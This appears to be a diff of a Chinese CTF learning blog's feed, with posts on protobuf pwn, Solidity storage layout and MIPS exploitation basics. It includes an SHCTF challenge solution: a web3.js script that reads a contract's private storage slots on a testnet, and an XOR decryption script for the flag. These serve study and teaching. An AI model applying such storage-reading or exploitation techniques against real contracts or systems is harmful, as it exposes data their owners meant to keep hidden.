+payload = msg.SerializeToString()		#转化成proto的序列化字符串
+p.sendline(payload)
+......
+</code></pre>
+<h4 id="判别proto版本方式"><a href="#判别proto版本方式" class="headerlink" title="判别proto版本方式"></a>判别proto版本方式</h4><p>一般proto分为proto2和proto3两个版本，在写proto文件时要在开头指明<code>syntax=proto2/3</code>。</p>
+<p>在proto3中移除了require这个修饰符，如果有的label位为0（required），就说明用的是proto2语法。</p>
+<p>其实也可以都带进去试试，总共就两个版本，别的地方没分析错的话总有一个会通过的。</p>
+<h4 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h4><h5 id="1-库找不到"><a href="#1-库找不到" class="headerlink" title="1.库找不到"></a>1.库找不到</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026002833645.png"
+                      class=""
+                >
+
+<p>可以手动在&#x2F;usr&#x2F;lib下添加一个链接</p>
+<pre><code class="shell">sudo ln -s /mnt/e/ctf/2024shctf/pwn/shctf——challage_pwn_protobuf/libprotobuf-c.so.1 /usr/lib/libprotobuf-c.so.1
+</code></pre>
+<h5 id="2-运行exp时因为引入了proto转成的python文件报错"><a href="#2-运行exp时因为引入了proto转成的python文件报错" class="headerlink" title="2.运行exp时因为引入了proto转成的python文件报错"></a>2.运行exp时因为引入了proto转成的python文件报错</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026154314346.png"
+                      class=""
+                >
+
+<p>提高python库中protobuf的版本</p>
+<pre><code class="shell">pip3 uninstall protobuf
+pip3 install protobuf==3.19.0
+</code></pre>
+<h5 id="3-逆出结构体后prpto一直无法正常解析"><a href="#3-逆出结构体后prpto一直无法正常解析" class="headerlink" title="3.逆出结构体后prpto一直无法正常解析"></a>3.逆出结构体后prpto一直无法正常解析</h5><p>可以尝试把<code>sendline</code>换成<code>send</code>，有时候多一个换行符就解析不出来了。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>protobuf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>solidity&amp;blockchain初探</title>
+    <url>/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<p>solidity这个语言广泛运用与智能合约的编写，想要入门区块链就得先了解这个语言。该语言其实与c语言用法类似。在solidity语言中，标识执行账户是用地址实现的，比如我们MetaMask中创建的Account的地址或是某个合约的地址。</p>
+<h3 id="1-一些基本概念与工具站"><a href="#1-一些基本概念与工具站" class="headerlink" title="1.一些基本概念与工具站"></a>1.一些基本概念与工具站</h3><h4 id="1）账户"><a href="#1）账户" class="headerlink" title="1）账户"></a>1）账户</h4><p><strong>外部账户</strong></p>
+<p>外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。</p>
+<p>一个外部账户具有以下特性</p>
+<ul>
+<li>拥有一定的 Ether</li>
+<li>可以发送交易、通过私钥控制</li>
+<li>没有相关联的代码</li>
+</ul>
+<p><strong>合约账户</strong> </p>
+<p>合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。</p>
+<p>一个合约账户具有以下特性</p>
+<ul>
+<li>拥有一定的 Ether</li>
+<li>有相关联的代码，代码通过交易或者其他合约发送的调用来激活</li>
+<li>当合约被执行时，只能操作合约账户拥有的特定存储</li>
+</ul>
+<h4 id="2）合约"><a href="#2）合约" class="headerlink" title="2）合约"></a>2）合约</h4><p>在区块链和智能合约的上下文中，合约通常是指一种程序或协议，能够在区块链上自动执行、控制或文档化法律事件和行动。以下是合约的一些关键特征：</p>
+<ol>
+<li><strong>智能合约</strong>：智能合约是一种自执行的合约，其中协议的条款以代码形式写入，运行在区块链上。它们能够自动执行合约条款，减少对中介的依赖。</li>
+<li><strong>去中心化</strong>：合约在区块链上运行，没有单一控制点，这使得合约更加透明和安全。</li>
+<li><strong>不可篡改性</strong>：一旦合约部署到区块链上，其内容就无法更改，这提供了强有力的防篡改保障。</li>
+<li><strong>透明性</strong>：合约的代码和执行是公开的，任何人都可以查看，从而提高了信任度。</li>
+<li><strong>自动执行</strong>：合约可以根据预设条件自动执行，省去人工干预的需要。例如，当某个条件被满足时，合约会自动转移资产。</li>
+<li><strong>多种用途</strong>：合约可以用于多种场景，如金融交易、身份验证、供应链管理、投票系统等。</li>
+</ol>
+<h4 id="3）常用网站及插件"><a href="#3）常用网站及插件" class="headerlink" title="3）常用网站及插件"></a>3）常用网站及插件</h4><ul>
+<li>MetaMask插件：可以创建属于自己的以太网账户，拥有一个地址，其相当于一个钱包，存着你不同网络中的以太币。</li>
+<li><a href="https://remix.ethereum.org/">Remix</a>：一个在线IDE，用于编辑合约以及与合约交互。</li>
+<li><a href="https://faucets.chain.link/">Fauctes</a>：水龙头，可以用来免费获取测试网络中免费的货币。</li>
+<li><a href="https://app.infura.io/">infura</a>：可以获取apikey，用于web3开发测试。</li>
+</ul>
+<h3 id="2-存储类型"><a href="#2-存储类型" class="headerlink" title="2.存储类型"></a>2.<strong>存储类型</strong></h3><p>Solidity 主要有三种存储类型：</p>
+<ul>
+<li><strong>storage</strong>：永久存储，存储在区块链上，所有合约状态变量（如 <code>uint256 totalSupply;</code>）都是存储在这里。每次修改都会消耗 gas。</li>
+<li><strong>memory</strong>：临时存储，存储在内存中，生命周期仅在当前调用期间。函数调用结束后，数据会被清除。适用于需要临时使用的数据，如函数内部的计算结果。</li>
+<li><strong>calldata</strong>：用于函数参数的只读数据存储位置，数据存在于外部调用时的输入中，通常用于优化 gas 使用。</li>
+</ul>
+<h3 id="3-修饰符"><a href="#3-修饰符" class="headerlink" title="3.修饰符"></a>3.修饰符</h3><h4 id="1）访问修饰符"><a href="#1）访问修饰符" class="headerlink" title="1）访问修饰符"></a>1）<strong>访问修饰符</strong></h4><ul>
+<li>**<code>public</code>**：函数或变量可以被任何合约或外部账户访问。</li>
+<li>**<code>private</code>**：函数或变量只能在定义它的合约内部访问，其他合约无法访问。</li>
+<li>**<code>internal</code>**：函数或变量只能在当前合约及其子合约中访问，外部合约无法访问。</li>
+<li>**<code>external</code>**：函数只能被外部账户或其他合约调用，不能在合约内部调用。</li>
+</ul>
+<h4 id="2）状态修饰符"><a href="#2）状态修饰符" class="headerlink" title="2）状态修饰符"></a>2）<strong>状态修饰符</strong></h4><ul>
+<li>**<code>view</code>**：函数不会修改区块链状态，且可以读取合约的状态变量。调用此函数不会消耗 gas。</li>
+<li>**<code>pure</code>**：函数不读取或修改任何状态变量，也不访问任何合约的状态。它只能使用传入的参数。调用此函数同样不会消耗 gas。</li>
+<li>**<code>payable</code>**：函数可以接收 ETH。用于处理涉及资金转移的功能。</li>
+</ul>
+<h4 id="3）其他常用修饰符"><a href="#3）其他常用修饰符" class="headerlink" title="3）其他常用修饰符"></a>3）<strong>其他常用修饰符</strong></h4><ul>
+<li>**<code>require</code>**：用于验证条件是否为真，如果条件不满足，则抛出异常并撤销交易。常用于输入验证和权限检查。</li>
+<li>**<code>assert</code>**：用于检查不应发生的条件，如果条件不满足，则抛出异常并撤销交易。通常用于内部错误和不变性验证。</li>
+<li>**<code>revert</code>**：显式撤销交易，并可以返回错误消息。与 <code>require</code> 类似，但可以用于更复杂的条件检查。</li>
+</ul>
+<h4 id="4）自定义修饰符"><a href="#4）自定义修饰符" class="headerlink" title="4）自定义修饰符"></a>4）自定义修饰符</h4><p>常见的是用于权限控制。</p>
+<pre><code class="solidity">modifier onlyOwner &#123;
+    require(msg.sender == owner, &quot;Not the contract owner&quot;);
+    _;			//_;用于替换实际的执行逻辑
+&#125;
+
+function restrictedFunction() public onlyOwner &#123;
+    // 只有合约的拥有者可以执行此函数
+&#125;
+</code></pre>
+<h4 id="5）Fallback-函数"><a href="#5）Fallback-函数" class="headerlink" title="5）Fallback 函数"></a>5）<strong>Fallback 函数</strong></h4><p>特殊的函数，当合约接收到 ETH 但没有匹配的函数调用时会被执行。可以用于接收资金。</p>
+<h3 id="4-常用内置函数以及全局变量"><a href="#4-常用内置函数以及全局变量" class="headerlink" title="4.常用内置函数以及全局变量"></a>4.常用内置函数以及全局变量</h3><ul>
+<li><code>abi.encodePacked</code> 是 Solidity 中的一个内置函数，用于将多个参数编码为一个字节数组。它在处理数据时非常有用，特别是在需要进行哈希计算、合约交互或其他数据处理时。</li>
+<li><code>Keccak256</code>： 将输入数据（无论大小）转换为固定长度的输出（256 位），即 32 字节的哈希值。</li>
+<li><code>msg.sender</code>：指向当前运行合约账户的地址</li>
+<li><code>tx.origin</code>：存着整个调用链最原始的调用者的地址，及交易的原始发起方</li>
+</ul>
+<h3 id="5-从示例看基础语法"><a href="#5-从示例看基础语法" class="headerlink" title="5.从示例看基础语法"></a>5.从示例看基础语法</h3><p>example：</p>
+<pre><code class="solidity">// WelcomeSHCTF2024.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract WelcomeSHCTF2024 &#123;
+
+    string public storedFlag;
+
+    constructor(string memory flag) &#123;
+        string memory xorResult = xorWithSHCTF(flag);
+        storedFlag = xorResult;
+    &#125;
+
+    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;
+        bytes memory flagBytes = bytes(flag);
+        bytes memory xorKey = bytes(&quot;shctf&quot;);
+        bytes memory result = new bytes(flagBytes.length);
+
+        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;
+            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));
+        &#125;
+
+        return string(result);
+    &#125;
+
+    function verifyXORedFlag(string memory inputFlag) public view returns (bool) &#123;
+        return keccak256(abi.encodePacked(storedFlag)) == keccak256(abi.encodePacked(xorWithSHCTF(inputFlag)));
+    &#125;
+&#125;
+</code></pre>
+<ul>
+<li><code>pragma solidity ^0.8.0;</code>：指明合约是用 Solidity 编写的，并且要求编译器版本为 0.8.0 或更高。</li>
+<li><code>contract</code>：中文译为合约，类似与class，实际上就是声明一个对象。</li>
+<li><code>string private storedFlag</code>：这个就很熟悉了，就是类型+访问修饰符+变量名的组合，声明一个变量</li>
+<li><code>constructor(params)&#123;&#125;</code>：这个就是该合约的构造函数，在创建时会接受参数并初始化</li>
+<li><code>function</code>：声明一个方法，参数可以带上修饰符，后面也可以跟上若干修饰符</li>
+</ul>
+<pre><code class="solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+interface IWelcomeSHCTF2024 &#123;
+    function verifyXORedFlag(string memory inputFlag) external view returns (bool);
+    function storedFlag() external view returns (string memory);
+&#125;
+
+contract exp&#123;
+    IWelcomeSHCTF2024 public tar;
+
+    constructor(address contractAddress) &#123;
+        // 使用给定的地址初始化合约实例
+        tar = IWelcomeSHCTF2024(contractAddress);
+    &#125;
+
+    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;
+        bytes memory flagBytes = bytes(flag);
+        bytes memory xorKey = bytes(&quot;shctf&quot;);
+        bytes memory result = new bytes(flagBytes.length);
+
+        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;
+            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));
+        &#125;
+
+        return string(result);
+    &#125;
+
+    function getFlag() public view returns (string memory) &#123;
+        // 调用 WelcomeSHCTF2024 合约的 verifyXORedFlag 函数
+        return xorWithSHCTF(tar.storedFlag());
+    &#125;
+&#125;
+</code></pre>
+<p>我们也可以写一个与上述实例相交互的脚本，这里我们假设上面的storedFlag是个public变量，其中要先定义一个<code>interface</code>接口，里面要写这个接口中能被外部调用的方法，也就是有external或public修饰的方法，其具体定义可以直接复制源码中方法的定义。这样定义之后，我们就可以通过传入合约实例的地址，来创建这么一个接口实例，然后就能调用该实例对外公开的方法。要访问属性的话要通过getter方法，也就是多的一句<code>function storedFlag() external view returns (string memory);</code>来实现属性的接口调用。我们可以在本地做实验以验证。</p>
+<h5 id="remix合约部署"><a href="#remix合约部署" class="headerlink" title="remix合约部署"></a>remix合约部署</h5><p>可以先创建一个新的工作区，选择default project就行。然后在contracts目录下新建自己合约文件，如<code>WelcomeSHCTF2024.sol</code>以及<code>exp.sol</code>，然后选择编译器版本后进行编译，之后转到<code>Deploy &amp; run transactions</code>界面。</p>
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161027491.png" class="">
+
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161608582.png" class="">
+
+<p>在环境上选Remix VM（与实际的测试网交互要选WalletConnect来连接到自己的账户），然后我们可以在deploy部署前输入一个flag字符串，作为该合约的constructor的参数。点击deploy进行合约的部署。</p>
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161816606.png" class="">
+
+<p>部署成功后底下Deployed Contracts会显示出内容，我们可以通过点击按钮来调用各个接口，有些接口的调用我们需要传参。可以发现我们的public变量也可以作为接口调用，点击storedFlag就能获取到原合约异或加密后的storedFlag的值</p>
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162140584.png" class="">
+
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162816996.png" class="">
+
+<p>然后我们复制一下这个自己部署的合约的地址，在编译完exp.sol后，在CONTRACT中选择exp.sol，传入刚才部署的合约地址用以接口调用。</p>
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174515117.png" class="">
+
+<p>成功以后，用我们之前编写的getFlag外部方法，就能直接获取到我们之前部署的flag了，这样能够获取到public存储的flag密文。</p>
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174257776.png" class="">
+
+
+
+<h3 id="6-存储层面"><a href="#6-存储层面" class="headerlink" title="6.存储层面"></a>6.存储层面</h3><p>这个感觉在ctf解题中是很重要的，感觉ctf-wiki中已经讲的很好了，这里我再整理一遍吧。</p>
+<h4 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h4><p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽，其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。</p>
+<pre><code># 插槽式数组存储
+----------------------------------
+|               0                |     # slot 0
+----------------------------------
+|               1                |     # slot 1
+----------------------------------
+|               2                |     # slot 2
+----------------------------------
+|              ...               |     # ...
+----------------------------------
+|              ...               |     # 每个插槽 32 字节
+----------------------------------
+|              ...               |     # ...
+----------------------------------
+|            2^256-1             |     # slot 2^256-1
+----------------------------------
+</code></pre>
+<p>当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。</p>
+<h4 id="存储规则"><a href="#存储规则" class="headerlink" title="存储规则"></a>存储规则</h4><ul>
+<li>存储插槽以低位对齐方式存储，在图上直观表示就是右对齐</li>
+<li>每个基本类型只占存储它们所需字节</li>
+<li>一个插槽内能存多个类型</li>
+<li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽</li>
+<li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）</li>
+</ul>
+<h5 id="一般存法"><a href="#一般存法" class="headerlink" title="一般存法"></a>一般存法</h5><p>如以下合约： </p>
+<pre><code>pragma solidity ^0.4.0;
+
+contract C &#123;
+    address a;      // 0
+    uint8 b;        // 0
+    uint256 c;      // 1
+    bytes24 d;      // 2
+&#125;
+</code></pre>
+<p>其存储布局如下：</p>
+<pre><code>-----------------------------------------------------
+| unused (11) | b (1) |            a (20)           | &lt;- slot 0
+-----------------------------------------------------
+|                       c (32)                      | &lt;- slot 1
+-----------------------------------------------------
+| unused (8) |                d (24)                | &lt;- slot 2
+-----------------------------------------------------
+</code></pre>
+<h5 id="动态数组存法"><a href="#动态数组存法" class="headerlink" title="动态数组存法"></a>动态数组存法</h5><p>会占用对应位置 <code>p</code> 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 <code>keccak256(p)</code> 处</p>
+<p>如以下合约： </p>
+<pre><code>pragma solidity ^0.4.0;
+
+contract C &#123;
+    uint256 a;      // 0
+    uint[] b;       // 1
+    uint256 c;      // 2
+&#125;
+</code></pre>
+<p>其存储布局如下：</p>
+<pre><code>-----------------------------------------------------
+|                      a (32)                       | &lt;- slot 0
+-----------------------------------------------------
+|                    b.length (32)                  | &lt;- slot 1
+-----------------------------------------------------
+|                      c (32)                       | &lt;- slot 2
+-----------------------------------------------------
+|                        ...                        |   ......
+-----------------------------------------------------
+|                      b[0] (32)                    | &lt;- slot `keccak256(1)`
+-----------------------------------------------------
+|                      b[1] (32)                    | &lt;- slot `keccak256(1) + 1`
+-----------------------------------------------------
+|                        ...                        |   ......
+-----------------------------------------------------
+</code></pre>
+<h5 id="字节数组和字符串存法"><a href="#字节数组和字符串存法" class="headerlink" title="字节数组和字符串存法"></a>字节数组和字符串存法</h5><p>如果 <code>bytes</code> 和 <code>string</code> 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于 31 字节， 则它存储在高位字节（左对齐），最低位字节存储 <code>length * 2</code>。如果数据长度超出 31 字节，则在主插槽存储 <code>length * 2 + 1</code>， 数据照常存储在 <code>keccak256(slot)</code> 中。</p>
+<h5 id="映射存法"><a href="#映射存法" class="headerlink" title="映射存法"></a>映射存法</h5><p>对于映射，其会占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p>
+<p>如以下合约： </p>
+<pre><code>pragma solidity ^0.4.0;
+
+contract C &#123;
+    mapping(address =&gt; uint) a;      // 0
+    uint256 b;                       // 1
+&#125;
+</code></pre>
+<p>其存储布局如下：</p>
+<pre><code>-----------------------------------------------------
+|                    reserved (a)                   | &lt;- slot 0
+-----------------------------------------------------
+|                      b (32)                       | &lt;- slot 1
+-----------------------------------------------------
+|                        ...                        |   ......
+-----------------------------------------------------
+|                     a[addr] (32)                  | &lt;- slot `keccak256(addr . 0)`
+-----------------------------------------------------
+|                        ...                        |   ......
+-----------------------------------------------------
+</code></pre>
+<h4 id="不同类型所占字节数"><a href="#不同类型所占字节数" class="headerlink" title="不同类型所占字节数"></a>不同类型所占字节数</h4><p>X&#x3D;{8,16,24,32,40,48,56,64,128,256}	N&#x3D;{x|1&lt;&#x3D;x&lt;&#x3D;16,x&#x3D;32}</p>
+<p>表中{x}代表X集合中某个元素，{n}表示N集合中某个元素，？？？为动态类型数据</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">大小（字节）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">address</td>
+<td align="center">20</td>
+</tr>
+<tr>
+<td align="center">address payable</td>
+<td align="center">20</td>
+</tr>
+<tr>
+<td align="center">bool</td>
+<td align="center">1</td>
+</tr>
+<tr>
+<td align="center">uint{x}</td>
+<td align="center">{x}&#x2F;8</td>
+</tr>
+<tr>
+<td align="center">int{x}</td>
+<td align="center">{x}&#x2F;8</td>
+</tr>
+<tr>
+<td align="center">bytes{n}</td>
+<td align="center">{n}</td>
+</tr>
+<tr>
+<td align="center">bytes（动态字节数组）</td>
+<td align="center">？？？</td>
+</tr>
+<tr>
+<td align="center">string（动态字符串）</td>
+<td align="center">？？？</td>
+</tr>
+<tr>
+<td align="center">结构体、数组、映射</td>
+<td align="center">？？？</td>
+</tr>
+</tbody></table>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="7-题目分析"><a href="#7-题目分析" class="headerlink" title="7.题目分析"></a>7.题目分析</h3><h5 id="SHCTF-just-Signin"><a href="#SHCTF-just-Signin" class="headerlink" title="[SHCTF] just Signin"></a>[SHCTF] just Signin</h5><img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161451526.png" class="">
+
+<p>先看题目提供的合约，其中有存了一个flag，然后我们可以从外部调用verifyXORedFlag来验证我们输入的flag是否正确，但显然我们不可能直接去爆破flag的值，这时候我们参考ctf-wiki中关于<code>Ethereum Storage</code>的介绍。</p>
+<blockquote>
+<p>由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为 private，我们仍能读到变量的具体值。</p>
+</blockquote>
+<blockquote>
+<p>利用 web3 提供的 <code>web3.eth.getStorageAt()</code> 方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。&#96;</p>
+</blockquote>
+<p>那么我们就可以去用web3这个js库编写脚本来分析插槽内容。根据内存存储的规则，string类型的变量是动态分配内存的，由于存的内容大于31字节，所以该位置slot0会存大小，而keccak256(0)中会存实际内容。而且由于内容大于32字节，所以我们要连续读几个插槽，这里读两个就能读到全部内容了。</p>
+<p>在写脚本过程中还遇到了几个坑：</p>
+<ul>
+<li>直接keccak256(0)出来的插槽位置中是全空的，实际上我们要得到的插槽位置在keccak256(abi.encodePacked(0))中，也就是在keccak256(‘0x0000000000000000000000000000000000000000000000000000000000000000’)中。</li>
+<li>其中用npm装web3库时后面测试运行时会报错，原因是我拿apt装的nodejs版本较低，解决方法是拿nvm重装高版本nodejs。</li>
+<li><code>const web3 = new Web3(&quot;https://sepolia.infura.io/v3/your_api&quot;);</code>这个创建实例一开始我后面的url不知道填什么，从ChainList找了几个url填进去，然后会发现对应地址处的插槽是全空的，显然是找错链了。后面在infura注册后用里面的测试网络sepolia能够正确找到对应合约。</li>
+</ul>
+<pre><code class="js">// const Web3 = require(&#39;web3&#39;);
+import Web3 from &#39;web3&#39;;
+// 连接到 Sepolia 测试网络（你需要替换成合适的提供商 URL）
+const web3 = new Web3(&quot;https://sepolia.infura.io/v3/your_api&quot;);
+
+// 合约地址（在题目中提供的地址）
+const contractAddress = &quot;0x3948DF4C50B1671eaa6b22876Ea746899a6916C1&quot;;
+
+// 获取存储的 private 变量 storedFlag
+async function getPrivateVariable() &#123;
+    try &#123;
+        // 读取存储插槽的数据
+        const data = await web3.eth.getStorageAt(contractAddress, 0);
+        console.log(`Stored len in slot 0:`, data);
+
+        var startSlot = await BigInt(web3.utils.keccak256(&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;));
+        // 要读取的起始插槽
+        const numSlots = 2; // 要读取的插槽数量
+
+        for (let i = 0; i &lt; numSlots; i++) &#123;
+            const slot = startSlot + BigInt(i);
+            const storageData = await web3.eth.getStorageAt(contractAddress, slot);
+            console.log(`Data at slot $&#123;slot&#125;:`, storageData);
+        &#125;
+
+    &#125; catch (error) &#123;
+        console.error(`Error reading slot:`, error);
+    &#125;
+    
+&#125;
+
+getPrivateVariable();
+</code></pre>
+<img src="/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005142240033.png" class="">
+
+<p>然后我们就能得到经过异或加密的密文，简单解密回去后就能得到flag</p>
+<p>python解密exp</p>
+<pre><code class="python">enc = [32, 32, 32, 32, 32, 8, 31, 6, 69, 5, 28, 5, 6, 43, 18, 28, 55, 23, 28, 85, 44, 10, 82, 27, 5, 24, 43, 11, 21, 15, 29, 55, 20, 68, 20, 31, 12, 30]
+key = &#39;shctf&#39;
+
+flag = &quot;&quot;
+for i in range(len(enc)):
+    ch = enc[i] ^ ord(key[i%5])
+    flag += chr(ch)
+
+print(&quot;&quot;.join(flag))
+</code></pre>
+]]></content>
+      <categories>
+        <category>BlockChain</category>
+      </categories>
+      <tags>
+        <tag>BlockChain</tag>
+        <tag>solidity</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mips_pwn</title>
+    <url>/2024/09/21/mips-pwn/</url>
+    <content><![CDATA[<h4 id="一、mips架构概述"><a href="#一、mips架构概述" class="headerlink" title="一、mips架构概述"></a>一、mips架构概述</h4><h5 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h5><table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th>别名</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$0</td>
+<td>$zero</td>
+<td>常量0</td>
+</tr>
+<tr>
+<td align="left">$1</td>
+<td>$at</td>
+<td>保留给汇编器（Assembler Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
+</tr>
+<tr>
+<td align="left">$2-$3</td>
+<td>$v0-$v1</td>
+<td>用于存储函数的返回值。</td>
+</tr>
+<tr>
+<td align="left">$4-$7</td>
+<td>$a0-$a3</td>
+<td>函数调用参数，用于传递最多 4 个函数参数。</td>
+</tr>
+<tr>
+<td align="left">$8-$15</td>
+<td>$t0-$t7</td>
+<td>临时寄存器。用于函数内部的临时计算，不需要保存其值。</td>
+</tr>
+<tr>
+<td align="left">$16-$23</td>
+<td>$s0-$s7</td>
+<td>保存寄存器。用于保存函数调用期间的值，调用函数时需要保留的值。</td>
+</tr>
+<tr>
+<td align="left">$24-$25</td>
+<td>$t8-$t9</td>
+<td>临时寄存器。与 <code>$t0-$t7</code> 类似，但通常不需要在函数调用中保存其值。</td>
+</tr>
+<tr>
+<td align="left">$26-$27</td>
+<td>$k0-$k1</td>
+<td>保留给操作系统内核。通常用于内核中进行系统调用或中断处理。</td>
+</tr>
+<tr>
+<td align="left">$28</td>
+<td>$gp</td>
+<td>全局指针。指向全局数据区域的基地址，便于访问全局变量。</td>
+</tr>
+<tr>
+<td align="left">$29</td>
+<td>$sp</td>
+<td>堆栈指针。指向当前堆栈的顶部，用于管理函数调用和局部变量。</td>
+</tr>
+<tr>
+<td align="left">$30</td>
+<td>$fp($s8)</td>
+<td>帧指针。指向当前栈帧的基地址，通常用于访问局部变量和参数。</td>
+</tr>
+<tr>
+<td align="left">$31</td>
+<td>$ra</td>
+<td>返回地址。用于存储函数调用的返回地址，在函数调用时保存，并在函数返回时使用。</td>
+</tr>
+<tr>
+<td align="left">PC</td>
+<td>PC</td>
+<td>保存当前正在执行的指令的地址，并在每次指令执行后自动递增，以指向下一条指令的地址。</td>
+</tr>
+</tbody></table>
+<p>mips架构中的fp寄存器相当于rbp，pc寄存器相当于rip。</p>
+<h5 id="2-特征"><a href="#2-特征" class="headerlink" title="2.特征"></a>2.特征</h5><ul>
+<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p>
+</li>
+<li><p><strong>MIPS 处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p>
+</li>
+<li><p>所有 MIPS 指令都具有固定的 32 位长度，这使得指令解码更加简单和高效。</p>
+</li>
+<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS 也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p>
+</li>
+<li><p>三种主要指令格式：</p>
+<ul>
+<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</li>
+<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</li>
+<li><strong>J 型</strong>：用于跳转，例如 <code>j</code>、<code>jal</code>。</li>
+</ul>
+</li>
+<li><p>流水线操作</p>
+<p>MIPS架构采用了流水线技术来提高指令执行的效率。流水线允许处理器同时处理多条指令的不同部分，从而大幅提高吞吐量。</p>
+<p>常见的MIPS芯片流水线操作分为五个阶段：</p>
+<ul>
+<li><strong>IF（Instruction Fetch，指令提取）</strong>：从内存中提取指令。</li>
+<li><strong>ID（Instruction Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
+<li><strong>EX（Execute，执行）</strong>：执行指令，包括算术运算、逻辑运算等。</li>
+<li><strong>MEM（Memory Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
+<li><strong>WB（Write Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
+</ul>
+<p>在理想情况下，流水线中的每个阶段都会同时进行，使得处理器可以每个时钟周期执行一条新指令。然而，由于某些指令的执行需要更多的时间，可能会导致流水线暂停（称为“流水线停顿”），从而影响性能。</p>
+<p><strong>分支延迟槽</strong></p>
+<p>MIPS架构有一个特殊的概念叫<strong>分支延迟槽</strong>。当程序遇到分支指令（如跳转指令）时，程序会跳转到新的地址去执行新指令。然而，由于流水线的设计，紧接在分支指令之后的指令已经在流水线中开始执行了。为了避免浪费，MIPS架构规定，<strong>分支后的第一条指令（即位于分支延迟槽中的指令）会在跳转之前执行</strong>。</p>
+<p>这意味着，在编写MIPS汇编代码或分析MIPS的二进制文件时，需要特别注意分支延迟槽的存在。例如，在以下MIPS汇编代码中：</p>
+<pre><code class="asm">.text:0007F944    move    $t9, $s0
+.text:0007F948    jalr    $t9              
+.text:0007F94C    move    $a0, $s1
+</code></pre>
+<p>虽然<code>jalr</code>指令是一个跳转指令，但紧接在其后的<code>move $a0, $s1</code>指令会在跳转之前执行。</p>
+<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p>
+</li>
+</ul>
+<h5 id="3-指令格式"><a href="#3-指令格式" class="headerlink" title="3.指令格式"></a>3.指令格式</h5><blockquote>
